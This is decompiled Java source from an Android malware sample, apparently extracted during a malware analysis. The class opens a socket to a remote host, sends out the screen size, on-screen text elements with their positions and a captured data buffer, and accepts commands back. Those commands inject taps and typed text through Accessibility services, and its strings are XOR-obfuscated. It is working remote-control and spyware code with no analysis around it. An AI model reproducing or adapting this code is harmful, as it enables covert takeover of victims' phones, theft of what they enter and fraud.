package com.zjxyxnvvp.nxvxchltf;

import android.content.Context;
import android.content.res.Resources;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.e;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class f extends Thread {
    private static short[] $ = {8833, 8877, 8876, 8876, 8871, 8865, 8886, 8871, 8870, 8930, 8886, 8877, 8930, 8865, 8878, 8875, 8871, 8876, 8886, 8930, 6916, 6942, 6916, 2437, 2439, 2439, 2433, 2455, 2455, 2445, 2438, 2445, 2440, 2445, 2448, 2461, 3534, 3567, 3554, 3583, 3551, 3566, 3571, 3583, 8228, 8230, 8241, 8236, 8234, 8235, 8250, 8228, 8247, 8226, 8240, 8232, 8224, 8235, 8241, 8250, 8246, 8224, 8241, 8250, 8241, 8224, 8253, 8241, 8250, 8230, 8237, 8228, 8247, 8246, 8224, 8244, 8240, 8224, 8235, 8230, 8224, 1472, 1503, 1479, 1493, 1474, 6435, 6408, 6402, 6410, 6403, 6421, 6421, 6453, 6403, 6420, 6416, 6415, 6405, 6403, 6492, 6492, 6410, 6409, 6405, 6413, -19276, -19301, -19300, -19301, -19327, -19302, -19305, -19306, -19246, -19311, -19298, -19301, -19305, -19300, -19322, -19246, -22983, -21410, -21477, -21492, -21492, -21410};
    public static final b h = new b();
    public static final AtomicBoolean i = new AtomicBoolean(true);
    public static final AtomicBoolean j = new AtomicBoolean(true);

    /* renamed from: a  reason: collision with root package name */
    private final Context f319a;

    /* renamed from: b  reason: collision with root package name */
    private final String f320b;
    private final int c;
    private BufferedInputStream d;
    private DataOutputStream e;
    private boolean f;
    private int g;

    private static String $(int i2, int i3, int i4) {
        char[] cArr = new char[i3 - i2];
        for (int i5 = 0; i5 < i3 - i2; i5++) {
            cArr[i5] = (char) ($[i2 + i5] ^ i4);
        }
        return new String(cArr);
    }

    public f(Context context, String str, int i2) {
        this.f319a = context;
        this.f320b = str;
        this.c = i2;
    }

    private void a() {
        i.set(true);
        h.e(false);
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress(this.f320b, this.c), 15000);
        this.d = new BufferedInputStream(socket.getInputStream());
        this.e = new DataOutputStream(socket.getOutputStream());
        e.a($(0, 20, 8898) + this.f320b + $(20, 23, 6948) + this.c);
        b();
    }

    private void b() {
        AccessibilityEvent obtain = AccessibilityEvent.obtain();
        obtain.setEventType(16384);
        obtain.setClassName(f.class.getName());
        obtain.getText().add("");
        ((AccessibilityManager) this.f319a.getSystemService($(23, 36, 2532))).sendAccessibilityEvent(obtain);
    }

    private void c(int i2, byte[] bArr) {
        this.e.writeInt(i2);
        this.e.writeInt(bArr.length);
        this.e.write(bArr);
        this.e.flush();
    }

    private void d() {
        int i2;
        if (this.d == null) {
            a();
        }
        boolean z = true;
        if (h.c()) {
            if (!this.f) {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
                int i3 = Resources.getSystem().getDisplayMetrics().widthPixels;
                int i4 = Resources.getSystem().getDisplayMetrics().heightPixels;
                dataOutputStream.writeInt(i3);
                dataOutputStream.writeInt(i4);
                byteArrayOutputStream.flush();
                c(0, byteArrayOutputStream.toByteArray());
                this.f = true;
            }
            ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream2 = new DataOutputStream(byteArrayOutputStream2);
            List<c> b2 = h.b();
            if (b2.size() > 0) {
                dataOutputStream2.writeShort(b2.size());
                for (c cVar : b2) {
                    if (j.get() || cVar.c()) {
                        dataOutputStream2.writeBoolean(true);
                        byte[] bytes = cVar.b().getBytes(StandardCharsets.UTF_8);
                        dataOutputStream2.writeInt(bytes.length);
                        dataOutputStream2.write(bytes);
                        dataOutputStream2.writeShort(cVar.a().left);
                        dataOutputStream2.writeShort(cVar.a().bottom);
                        dataOutputStream2.writeBoolean(cVar.c());
                    } else {
                        dataOutputStream2.writeBoolean(false);
                    }
                }
            }
            List<a> a2 = h.a();
            dataOutputStream2.writeShort(a2.size());
            for (a aVar : a2) {
                int i5 = aVar.a().left;
                int i6 = aVar.a().bottom;
                int i7 = aVar.a().right - aVar.a().left;
                dataOutputStream2.writeShort(i5);
                dataOutputStream2.writeShort(i6);
                dataOutputStream2.writeShort(i7);
                dataOutputStream2.writeShort(aVar.a().bottom - aVar.a().top);
                byte[] bytes2 = aVar.b().getBytes(StandardCharsets.UTF_8);
                dataOutputStream2.writeInt(bytes2.length);
                dataOutputStream2.write(bytes2);
            }
            dataOutputStream2.writeBoolean(e.p.get());
            if (e.p.get()) {
                byte[] byteArray = e.q.toByteArray();
                dataOutputStream2.writeInt(byteArray.length);
                dataOutputStream2.write(byteArray);
                e.p.set(false);
            }
            dataOutputStream2.flush();
            c(1, byteArrayOutputStream2.toByteArray());
            h.e(false);
        } else if (!i.get()) {
            if (this.g == 0 && this.d.available() >= 4) {
                byte[] bArr = new byte[4];
                if (this.d.read(bArr, 0, 4) == 4) {
                    this.g = ByteBuffer.wrap(bArr).getInt();
                } else {
                    return;
                }
            }
            if (this.g != 0 && this.d.available() >= (i2 = this.g)) {
                byte[] bArr2 = new byte[i2];
                if (this.d.read(bArr2, 0, i2) == this.g) {
                    ByteBuffer wrap = ByteBuffer.wrap(bArr2);
                    i.set(wrap.get() > 0);
                    j.set(wrap.get() > 0);
                    e.l.set(wrap.get() > 0);
                    this.g = 0;
                    if (wrap.get() > 0) {
                        short s = wrap.getShort();
                        short s2 = wrap.getShort();
                        if (wrap.getShort() == 0) {
                            UIDNwaidobaWIODb.e.e(s, s2);
                        } else {
                            UIDNwaidobaWIODb.m.add(new Point(s, s2));
                        }
                    }
                    short s3 = wrap.getShort();
                    for (int i8 = 0; i8 < s3; i8++) {
                        short s4 = wrap.getShort();
                        short s5 = wrap.getShort();
                        wrap.getShort();
                        wrap.getShort();
                        int i9 = wrap.getShort();
                        byte[] bArr3 = new byte[i9];
                        wrap.get(bArr3, 0, i9);
                        String str = new String(bArr3, StandardCharsets.UTF_8);
                        AccessibilityNodeInfo rootInActiveWindow = UIDNwaidobaWIODb.e.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            for (AccessibilityNodeInfo accessibilityNodeInfo : b.b(rootInActiveWindow, $(36, 44, 3467))) {
                                Rect rect = new Rect();
                                accessibilityNodeInfo.getBoundsInScreen(rect);
                                if (rect.left == s4 && rect.bottom == s5) {
                                    Bundle bundle = new Bundle();
                                    bundle.putString($(44, 81, 8293), str);
                                    accessibilityNodeInfo.performAction(2097152, bundle);
                                }
                            }
                        }
                    }
                    if (wrap.hasRemaining()) {
                        e.m.set(wrap.get() > 0);
                        if (wrap.get() <= 0) {
                            z = false;
                        }
                        e.n.set(z);
                    }
                    b();
                    try {
                        PowerManager.WakeLock newWakeLock = ((PowerManager) this.f319a.getSystemService($(81, 86, 1456))).newWakeLock(268435482, $(86, 106, 6502));
                        newWakeLock.acquire();
                        newWakeLock.release();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        while (true) {
            try {
                d();
            } catch (Throwable th) {
                th.printStackTrace();
                try {
                    e.k();
                    e.l.set(false);
                    e.o.set(false);
                    e.p.set(false);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                e.a($(106, 122, -19214) + this.f320b + $(122, 123, -23037) + this.c + $(123, 128, -21378) + th.getMessage());
                return;
            }
        }
    }
}
